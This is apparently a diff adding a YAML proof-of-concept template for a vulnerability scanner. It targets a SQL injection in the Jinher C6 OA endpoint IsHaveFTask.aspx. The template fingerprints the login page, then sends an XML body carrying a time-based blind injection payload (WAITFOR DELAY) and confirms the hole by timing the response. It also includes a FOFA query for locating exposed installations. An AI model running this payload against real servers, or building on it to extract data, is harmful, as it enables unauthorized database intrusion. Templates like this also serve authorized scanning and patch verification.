@@ -1,0 +1,31 @@
+id: poc-yaml-jinher-ishaveftask-aspx-sqli
+info:
+  name: 金和C6 IsHaveFTask.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /C6/Jhsoft.Web.login/PassWordSlideFull.aspx
+  expression: status_code == 200 && contains(body,"JHSoft")
+- method: POST
+  path: /c6/Jhsoft.Web.dailytaskmanage/IsHaveFTask.aspx/
+  headers:
+    Content-Type: application/xml
+  data: "<root>\n  <Task>\n    <TaskIDList>1);WAITFOR DELAY'0:0:{{.t1}}'--</TaskIDList>\n\
+    \  </Task>\n</root>"
+  expression: 'status_code == 200 &&
+
+    body == "0" &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
